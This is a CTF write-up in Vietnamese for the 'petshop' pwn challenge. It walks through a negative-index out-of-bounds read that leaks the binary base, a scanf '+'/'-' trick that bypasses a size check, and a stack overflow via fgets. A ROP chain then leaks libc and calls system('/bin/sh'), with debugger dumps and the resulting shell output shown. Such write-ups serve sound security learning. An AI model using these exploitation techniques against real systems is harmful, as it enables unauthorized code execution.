# write up petshop 
```c
     if (__isoc99_sscanf(input, "%3s %d", &name, &idx) == 2)
        {
            idx -= 1;
            (unsigned int)ptr = malloc(16);
            *((int *)&(&pet_list)[8 * pet_count]) = rax<8>;
            if (!strncmp(&name, "cat", 3, rax<8>))
            {
                if (idx <= 3)
                {
                    *((long long *)*((long long *)&(&pet_list)[8 * pet_count])) = *((long long *)&(&cats)[8 * idx]);
                }
                else
                {
                    puts("Invalid type of cat!");
                    *((long long *)&(&pet_list)[8 * pet_count]) = 0;
                    goto LABEL_401538;
                }
            }     
            ...
```
- thông qua đoạn code trên thấy rằng idx đầu vào là 1 số nguyên có dấu và chỉ check <=3 mà không check >0 nên bài đã bị out of bound
- vì thế khi nhập idx âm thì ta có thể đưa 1 dữ liệu nào đó ngoài vùng tên pets nào đó vào pet_list 
```assembly 
    0c:0060│  0x555555557f80 (strncmp@got[plt]) —▸ 0x7ffff7f59230 (__strncmp_avx2) ◂— endbr64 
    0d:0068│  0x555555557f88 (puts@got[plt]) —▸ 0x7ffff7e59420 (puts) ◂— endbr64 
    0e:0070│  0x555555557f90 (setbuf@got[plt]) —▸ 0x7ffff7e60ad0 (setbuf) ◂— endbr64 
    0f:0078│  0x555555557f98 (printf@got[plt]) —▸ 0x7ffff7e36c90 (printf) ◂— endbr64 
    pwndbg> 
    10:0080│  0x555555557fa0 (memset@got[plt]) —▸ 0x7ffff7f60d90 (__memset_avx2_unaligned_erms) ◂— endbr64 
    11:0088│  0x555555557fa8 (fgets@got[plt]) —▸ 0x7ffff7e57630 (fgets) ◂— endbr64 
    12:0090│  0x555555557fb0 (getchar@got[plt]) —▸ 0x7ffff7e60560 (getchar) ◂— endbr64 
    13:0098│  0x555555557fb8 (malloc@got[plt]) —▸ 0x7ffff7e6f0e0 (malloc) ◂— endbr64 
    14:00a0│  0x555555557fc0 (__isoc99_sscanf@got.plt) —▸ 0x7ffff7e38270 (__isoc99_sscanf) ◂— endbr64 
    15:00a8│  0x555555557fc8 (__isoc99_scanf@got.plt) —▸ 0x7ffff7e380b0 (__isoc99_scanf) ◂— endbr64 
    16:00b0│  0x555555557fd0 (strdup@got[plt]) —▸ 0x7ffff7e74370 (strdup) ◂— endbr64 
    17:00b8│  0x555555557fd8 ◂— 0
    pwndbg> 
    18:00c0│  0x555555557fe0 —▸ 0x7ffff7df8f90 (__libc_start_main) ◂— endbr64 
    19:00c8│  0x555555557fe8 ◂— 0
    1a:00d0│  0x555555557ff0 ◂— 0
    1b:00d8│  0x555555557ff8 —▸ 0x7ffff7e1bf10 (__cxa_finalize) ◂— endbr64 
    1c:00e0│  0x555555558000 (data_start) ◂— 0
    1d:00e8│  0x555555558008 (__dso_handle) ◂— 0x555555558008 (__dso_handle) # đây chính là địa chỉ có thể leak vì nó trỏ tới chính nó nên khi lấy dữ liệu ra thì nó lấy dữ liệu là chính nó theo cách mà nó lấy tên của mấy con pets
    1e:00f0│  0x555555558010 (__dso_handle+8) ◂— 0
    1f:00f8│  0x555555558018 (__dso_handle+16) ◂— 0
    pwndbg> 
    20:0100│  0x555555558020 (cats) —▸ 0x555555556008 ◂— 'British Shorthair' # tên của mấy con pets ở đây 
    21:0108│  0x555555558028 (cats+8) —▸ 0x55555555601a ◂— 'Scottish Fold'
    22:0110│  0x555555558030 (cats+16) —▸ 0x555555556028 ◂— 0x6573656d616953 /* 'Siamese' */
    23:0118│  0x555555558038 (cats+24) —▸ 0x555555556030 ◂— 0x6c41006e61697341 /* 'Asian' */
    24:0120│  0x555555558040 (dogs) —▸ 0x555555556036 ◂— 'Alaskan Malamute'
    25:0128│  0x555555558048 (dogs+8) —▸ 0x555555556047 ◂— 0x6f47006967726f43 /* 'Corgi' */
    26:0130│  0x555555558050 (dogs+16) —▸ 0x55555555604d ◂— 'Golden Retriever'
    27:0138│  0x555555558058 (dogs+24) —▸ 0x55555555605e ◂— 'Chihuahua'
```
- sau khi có nơi để leak thì em leak địa chỉ và có được địa chỉ base rồi sau đó tính gadget để leak libc
```python
   sla(b"You    -->",b"buy cat -2")
   sla(b"You    -->",b"hello1")
   sla(b"You    -->",b"info mine")
```
- sau khi vào phần info là sẽ có được địa chỉ thay cho vị trí tên con pet
- tiếp theo nữa qua hàm sell, vì ta có thể set size cho fgets thông qua hàm scanf bên trên, nhưng có 1 điều là size đã được check kỹ càng 
```c
    if (scanf("%d", &size) != 1 || *((int *)&size) > 0 && *((int *)&size) <= 511)
    ...
   fgets(&buff, *((int *)&size), stdin);
```
- tuy nhiên có 1 ký tự đặc biệt khiến cho scanf không thể đọc được vì không có specifier nào của scanf đọc được nó, chính vì vậy có thể sử dụng nó để bypass scanf , dấu '+' hoặc dấu '-' và lấy 1 kích thước khủng cho fgets buff vì biến chứa size không được clear sau khi nhập lần đầu nên lợi dụng nó cho lần thứ 2
- vì dấu '+' và dấu '-' gây  ra EOF mà không gây break stdin nên vì thế fgets sẽ được nhập lần tiếp theo với size lớn, EOF gây ra nhằm làm 1 điều kiện trong if statement trở nên không thỏa mãn khiến ta có thể bypass check
```c
────────────────────────────[ DECOMPILER:ANGR:SELL:28 ]────────────────────────────
    23	        if (scanf("%d", &size) != 1 || *((int *)&size) > 0 && *((int *)&size) <= 511)
    24	        {
    25	            getchar();
    26	            puts("Seller --> Your reason?");
    27	            printf("You    --> ");
→   28	            fgets(&buff, *((int *)&size), stdin);
    29	            puts("Seller --> That seems reasonable!");
    30	        }
    31	        else
    32	        {
    33	            puts("Invalid size!");
───────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────
 ► 0x5555555556b1 <sell+367>    call   555555555140h               <fgets@plt>
        s: 0x7fffffffe4f0 ◂— 0
        n: 0x10c6
        stream: 0x7ffff7fc1980 (_IO_2_1_stdin_) ◂— 0xfbad208b
───────────────────────────────────────────────────────────────────────────────────
```
- vậy là ok, em chỉ cần dùng pop rdi có sẵn trong binary và 1 phần của hàm sell là có thể leak libc và thực hiện read tiếp 
```assembly
   0x0000555555555693 <+337>:	call   0x555555555120 <printf>
   0x0000555555555698 <+342>:	mov    rdx,QWORD PTR [rip+0x29d1]        # 0x555555558070
   0x000055555555569f <+349>:	mov    ecx,DWORD PTR [rbp-0x208]
   0x00005555555556a5 <+355>:	lea    rax,[rbp-0x200]
   0x00005555555556ac <+362>:	mov    esi,ecx
   0x00005555555556ae <+364>:	mov    rdi,rax
   0x00005555555556b1 <+367>:	call   0x555555555140 <fgets>
   0x00005555555556b6 <+372>:	lea    rdi,[rip+0xb2b]        # 0x5555555561e8
   0x00005555555556bd <+379>:	call   0x555555555100 <puts>
   0x00005555555556c2 <+384>:	leave
   0x00005555555556c3 <+385>:	ret
```
- sau khi có libc và có được gadgets thì em sẽ overwrite lần nữa
```bash
    b'Seller --> That seems reasonable!\n'
[DEBUG] Received 0x6 bytes:
    00000000  20 94 e5 f7  ff 7f                                  │ ···│··│
    00000006
[*] libc_system: 0x7ffff7e27290
[*] bin_sh_libc: 0x7ffff7f895bd
[*] leaking libc: 0x7ffff7e59420
[*] base libc: 0x7ffff7dd5000
```
- vậy là lấy được shell rồi
```bash
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x87 bytes:
    b'a.py\t    libc-2.31.so  petshop      petshop.md  petshope.adb   solve.py\n'
    b'ld-2.31.so  libc.so.6\t  petshop.adb  petshope    petshope.bndb\n'
a.py        libc-2.31.so  petshop      petshop.md  petshope.adb   solve.py
ld-2.31.so  libc.so.6      petshop.adb  petshope    petshope.bndb
$ uname -a 
[DEBUG] Sent 0xa bytes:
    b'uname -a \n'
[DEBUG] Received 0x4c bytes:
    b'Linux archlinux 6.1.82 #1 SMP Tue Mar 26 17:53:34 +07 2024 x86_64 GNU/Linux\n'
Linux archlinux 6.1.82 #1 SMP Tue Mar 26 17:53:34 +07 2024 x86_64 GNU/Linux
$  
```

